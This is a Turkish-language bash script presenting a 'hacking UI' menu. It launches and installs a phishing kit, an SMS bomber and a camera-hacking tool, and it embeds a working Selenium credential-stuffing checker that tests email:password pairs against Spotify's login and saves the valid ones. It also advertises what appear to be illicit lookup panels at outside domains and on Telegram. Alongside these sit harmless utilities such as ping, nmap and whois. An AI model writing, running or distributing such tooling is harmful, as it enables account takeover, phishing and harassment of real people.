#!/bin/bash

# ANSI renk kodları
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
C='\033[1;36m'
W='\033[0m'

# Sistem bilgisi ve tarih/saat
show_info() {
    echo -e "${B}───────────────────────────────${W}"
    echo -e "${G}Tarih & Saat: $(date +"%d %B %Y %H:%M:%S")"
    echo -e "Cihaz Adı: $(hostname)"
    echo -e "${B}───────────────────────────────${W}"
}

# Banner
banner() {
    clear
    # Üstte Em4nn UI Welcome!
    echo -e "${M}==============================================${W}"
    echo -e "${G}           Em4nn Hacking UI Welcome!${W}"
    echo -e "${M}==============================================${W}"
    sleep 1

    # Mevcut banner
    echo -e "${C}"
    echo " ███████╗███╗   ███╗4𝐍𝟏 𝐓𝐎𝐎𝐋 "
    echo " ██╔════╝████╗ ████║"
    echo " █████╗  ██╔████╔██║"
    echo " ██╔══╝  ██║╚██╔╝██║"
    echo " ███████╗██║ ╚═╝ ██║"
    echo " ╚══════╝╚═╝     ╚═╝"
    echo -e "${W}"
    sleep 1 
}

# Menü
menu() {
    echo -e "${Y}"
    echo "Yöntemleri Seçin:"
    echo -e "${R}[1]${W} Phishing (Zphisher kurulu olmalı)"
    echo -e "${R}[2]${W} SMS Bomber (Enough-Reborn kurulu olmalı)"
    echo -e "${R}[3]${W} Kamera Hack - (CamHack kurulu olmalı)"
    echo -e "${R}[4]${W} Güncel P4n4l"
    echo -e "${R}[5]${W} Spotify Checker [Aktif Değil]"
    echo -e "${R}[6]${W} Ping Testi"
    echo -e "${R}[7]${W} Traceroute"
    echo -e "${R}[8]${W} Port Tarama (Nmap)"
    echo -e "${R}[9]${W} Email Sorgulama"
    echo -e "${R}[10]${W} IP / GeoIP Bilgisi"
    echo -e "${R}[11]${W} Domain / Subdomain Sorgusu"
    echo -e "${R}[12]${W} CPU / RAM Durumu"
    echo -e "${R}[13]${W} Disk Kullanımı"
    echo -e "${R}[14]${W} Ağ Trafiği İzleme"
    echo -e "${R}[15]${W} Link Kısaltma / QR Kod Oluşturma"
    echo -e "${R}[16]${W} t.me/em4nhackingui"
    echo -e "${R}[99]${W} Gerekli kütüphaneleri Yükle"
    echo -e "${R}[0]${W} Çıkış"
    echo
}

# Spotify Checker Online Python
spotify_checker() {
python3 - <<END
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from rich.console import Console

console = Console()

console.print("[bold cyan][+]---Spotify Account Checker v2.1 (Konsol Girişi)---[+][/bold cyan]")
console.print("[bold cyan][+]---Powered By Emin INC.--[+][/bold cyan]")

valid_count = 0
invalid_count = 0
valid_accounts = []

# --- Chrome Ayarları ---
chrome_options = Options()
chrome_options.add_argument("--headless=new")  # Headless modu aktif edildi
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--log-level=3")
chrome_options.add_argument(
    "user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

driver = webdriver.Chrome(options=chrome_options)
wait = WebDriverWait(driver, 10)

login_url = "https://accounts.spotify.com/us/login?login_hint=&allow_password=1&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F%3Fflow_ctx%3D48f0092f-1b88-4241-850e-c69c1dd12d46%3A1753854776&flow_ctx=48f0092f-1b88-4241-850e-c69c1dd12d46%3A1753854776"

def check_account(email, password):
    global valid_count, invalid_count
    try:
        driver.get(login_url)
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#login-username")))
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#login-password")))

        # Alanlar doldur
        email_field = driver.find_element(By.CSS_SELECTOR, "input#login-username")
        password_field = driver.find_element(By.CSS_SELECTOR, "input#login-password")
        email_field.clear()
        password_field.clear()
        email_field.send_keys(email)
        password_field.send_keys(password)
        time.sleep(1)  # İnsan gibi davranış
        password_field.send_keys(Keys.RETURN)

        try:
            # Spotify ana sayfa yönlendirme kontrolü
            wait.until(EC.url_contains("open.spotify.com"))
            console.print(f"[bold green][+] {email}:{password} - Geçerli[/bold green]")
            valid_accounts.append(f"{email}:{password}")
            valid_count += 1
        except TimeoutException:
            console.print(f"[bold red][-] {email}:{password} - Geçersiz[/bold red]")
            invalid_count += 1

    except Exception as e:
        console.print(f"[bold yellow]Hata: {e} - {email}:{password}[/bold yellow]")

def check_accounts_console():
    global valid_count, invalid_count
    console.print("[bold cyan]Spotify Checker Konsol Girişi Aktif[/bold cyan]")
    console.print("Format: email:password")
    console.print("Çıkmak için 'q' girin.\n")

    while True:
        creds = input("Hesap (email:password): ").strip()
        if creds.lower() == "q":
            break
        if ":" not in creds:
            console.print("[bold yellow]Geçersiz format! email:password şeklinde girin.[/bold yellow]")
            continue
        email, password = creds.split(":", 1)
        check_account(email, password)

    console.print("[bold cyan]Geçerli hesaplar kaydediliyor...[/bold cyan]")
    if valid_accounts:
        with open("spotify_worksAcc.txt", "w") as outfile:
            outfile.writelines(account + "\n" for account in valid_accounts)

    console.print(f"\n[bold green]Geçerli hesaplar:[/bold green] {valid_count}")
    console.print(f"[bold red]Geçersiz hesaplar:[/bold red] {invalid_count}")

if __name__ == "__main__":
    check_accounts_console()
    driver.quit()
    console.print("[bold magenta]Kontrol tamamlandı. Enter ile çıkış...[/bold magenta]")
    input()
END
}

# Ana döngü
while true; do
    banner
    show_info
    menu
    read -p "Seçiminiz >> " choice

    case $choice in
        1)
            cd ~/zphisher && bash zphisher.sh
            ;;
        2)
            cd ~/Enough-Reborn && python3 enough.py
            ;;
        3)
            cd ~/CamHack && bash CamHack.sh
            ;;
        4)
            echo -e "${M}──────────────────────${W}"
            echo "🔗 𝐋𝐈𝐍𝐊: https://707check.pro"
            echo "          https://ozkaya.store/"
            echo "          https://focusum.store/"
            echo "──────────────────────"
            echo "⚡️ 𝐊e𝐘: ÜCRETSİZ GİRİŞ MEVCUT"
            echo "──────────────────────"
            echo "🚫 𝐕𝐏𝐍𝐒𝐈𝐙 𝐆𝐈𝐑𝐌𝐄𝐙 🚫"
            echo "──────────────────────"
            echo "En Güncel Linkler t.me/emininc2025"
            read -p "Devam etmek için Enter..."
            ;;
        5)
            spotify_checker
            ;;
        6)
            read -p "Hedef IP veya domain: " target
            ping -c 4 "$target"
            read -p "Devam etmek için Enter..."
            ;;
        7)
            read -p "Hedef IP veya domain: " target
            traceroute "$target"
            read -p "Devam etmek için Enter..."
            ;;
        8)
            read -p "Hedef IP veya domain: " target
            nmap -A "$target"
            read -p "Devam etmek için Enter..."
            ;;
        9)
            read -p "Email adresi girin: " email
            if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}$ ]]; then
                echo "Email formatı geçerli: $email"
            else
                echo "Geçersiz email formatı!"
            fi
            read -p "Devam etmek için Enter..."
            ;;
        10)
            read -p "IP adresi girin: " ipaddr
            curl ipinfo.io/"$ipaddr"
            read -p "Devam etmek için Enter..."
            ;;
        11)
            read -p "Domain girin: " domain
            whois "$domain"
            read -p "Devam etmek için Enter..."
            ;;
        12)
            echo -e "${M}────────────────────────${W}"
            echo -e "${G}📊 CPU & RAM Durumu${W}"
            echo -e "${M}────────────────────────${W}"
            top -b -n 1 | head -n 15
            echo -e "${M}────────────────────────${W}"
            read -p "Devam etmek için Enter..."
            ;;
        13)
            echo -e "${M}────────────────────────${W}"
            echo -e "${G}💾 Disk Kullanımı${W}"
            echo -e "${M}────────────────────────${W}"
            df -h | awk 'NR==1 || $6=="/" || $6=="/home"{print}'
            echo -e "${M}────────────────────────${W}"
            read -p "Devam etmek için Enter..."
            ;;
        14)
            echo -e "${M}────────────────────────${W}"
            echo -e "${G}🌐 Ağ Trafiği İzleme (iftop)${W}"
            echo -e "${M}────────────────────────${W}"
            echo "Çıkmak için Ctrl+C kullanın..."
            sudo iftop
            read -p "Devam etmek için Enter..."
            ;;
        15)
            read -p "Link girin: " url
            if command -v qrencode >/dev/null 2>&1; then
                echo "$url" | qrencode -o qr.png
                echo "QR kod qr.png olarak oluşturuldu."
            else
                echo "qrencode yüklü değil! (sudo apt install qrencode)"
            fi
            read -p "Devam etmek için Enter..."
            ;;
        16)
            echo -e "${M}Güncelleme Ve Haberler t.me/em4nhackingui Em4n Inc...${W}"
            read -p "Devam etmek için Enter..."
            ;;
        
        99) 
            echo -e "${Y}Kütüphaneler ve gerekli projeler kuruluyor...${W}"
            
            # Sistem paketleri
            sudo apt update && sudo apt upgrade -y
            sudo apt install -y curl whois traceroute nmap iftop git wget unzip python3 python3-pip chromium-browser chromium-chromedriver qrencode
            
            # Python kütüphaneleri
            pip3 install --upgrade pip
            pip3 install selenium rich
            
            # Reposlar
            if [ ! -d "$HOME/zphisher" ]; then
                git clone https://github.com/htr-tech/zphisher.git "$HOME/zphisher"
            else
                echo -e "${C}Zphisher zaten mevcut, atlanıyor.${W}"
            fi
            
            if [ ! -d "$HOME/Enough-Reborn" ]; then
                git clone https://github.com/thewhiteh4t/Enough-Reborn.git "$HOME/Enough-Reborn"
            else
                echo -e "${C}Enough-Reborn zaten mevcut, atlanıyor.${W}"
            fi
            
            CAMHACK_REPO="https://github.com/username/CamHack.git"
            if [ ! -d "$HOME/CamHack" ]; then
                git clone "$CAMHACK_REPO" "$HOME/CamHack"
            else
                echo -e "${C}CamHack zaten mevcut, atlanıyor.${W}"
            fi
            
            echo -e "${G}Kurulum tamamlandı!${W}"
            read -p "Devam etmek için Enter..." 
          ;;
       
       0)
            exit 0
            ;;
        *)
            echo -e "${R}Geçersiz seçim!${W}"
            sleep 1
            ;;
    esac
done
